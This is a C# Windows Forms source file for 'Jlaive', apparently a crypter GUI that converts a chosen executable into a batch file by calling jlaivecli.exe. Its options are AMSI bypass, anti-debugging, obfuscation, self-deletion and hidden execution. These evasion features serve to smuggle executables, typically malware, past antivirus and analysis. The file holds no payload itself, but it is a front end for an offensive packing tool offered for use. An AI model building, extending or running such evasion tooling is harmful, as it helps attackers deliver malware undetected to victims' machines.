using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace Jlaive
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            textBox1.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            buildButton.Enabled = false;
            string arguments = string.Empty;
            arguments += "--input \"" + textBox1.Text + "\" ";
            arguments += "--output \"" + Path.ChangeExtension(textBox1.Text, "bat") + "\" ";
            if (bypassAMSI.Checked) arguments += "--amsibypass ";
            if (antiDebug.Checked) arguments += "--antidebug ";
            if (obfuscate.Checked) arguments += "--obfuscate ";
            if (selfDelete.Checked) arguments += "--deleteself ";
            if (hidden.Checked) arguments += "--hidden ";
            Process.Start("cmd.exe", "/c jlaivecli.exe " + arguments.Trim() + " & timeout /t 3 /nobreak >nul").WaitForExit();
            buildButton.Enabled = true;
        }
    }
}